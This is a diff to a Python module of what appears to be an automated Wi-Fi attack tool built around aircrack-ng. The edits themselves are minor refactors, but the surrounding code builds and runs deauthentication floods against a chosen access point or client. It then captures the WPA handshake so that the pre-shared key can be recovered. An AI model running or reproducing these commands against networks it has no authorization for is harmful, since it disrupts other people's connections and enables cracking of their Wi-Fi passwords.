@@ -18,9 +18,9 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
 
         # Check if handshake directory exists.
         if not min(constants.HANDSHAKE_FILES.exists(), constants.TEMP_FILES.exists(), constants.CAP_FILES.exists()):
-            constants.HANDSHAKE_FILES.mkdir(exist_ok=True)
-            constants.TEMP_FILES.mkdir(exist_ok=True)
-            constants.CAP_FILES.mkdir(exist_ok=True)
+            constants.HANDSHAKE_FILES.mkdir(parents=True, exist_ok=True)
+            constants.TEMP_FILES.mkdir(parents=True, exist_ok=True)
+            constants.CAP_FILES.mkdir(parents=True, exist_ok=True)
 
         term_colours.Colours.reset_colours = reset_colours
         self.InputManager = tk_elements.InputManager
@@ -138,7 +138,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
                                                               "Cipher", "Auth", "PWR", "ESSID"))
         ap_table.add_row(self.target_ap)
         print(ap_table, end="\n\n")
-        self.green.print_success(f"Target AP selected, let's capture a handshake for PSK retrieval.")
+        self.green.print_success("Target AP selected, let's capture a handshake for PSK retrieval.")
         self.cap_path = constants.CAP_FILES / token_hex()
 
         if chosen == 1:
@@ -148,10 +148,10 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             deauth_count: int = self.InputManager("modules/aircrack/deauth_broadcast_count").get(500, False, False, 0)
             print()
             cmd: str = (f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} {self.card_name} && "
-                   f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
-                   f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                   " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"
-                   " pkill airodump-ng)")  # noqa: W605
+                        f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
+                        f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
+                        " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                        " pkill airodump-ng)")
             self.yellow.print_status(
                 "i", "When you're ready, press enter, if a deauth isn't captured, press Ctrl-C & try again.\n"
             )
@@ -208,8 +208,8 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
                 f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} -c {client_mac} {self.card_name}"
                 f" && {constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                 f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"
-                " pkill airodump-ng)"  # noqa: W605
+                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                " pkill airodump-ng)"
             )
 
         elif chosen == 3:
@@ -221,8 +221,8 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             cmd = (
                 f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                 f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"
-                " pkill airodump-ng)"  # noqa: W605
+                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                " pkill airodump-ng)"
             )
 
         self.cap_path = str(self.cap_path) + "-01.cap"
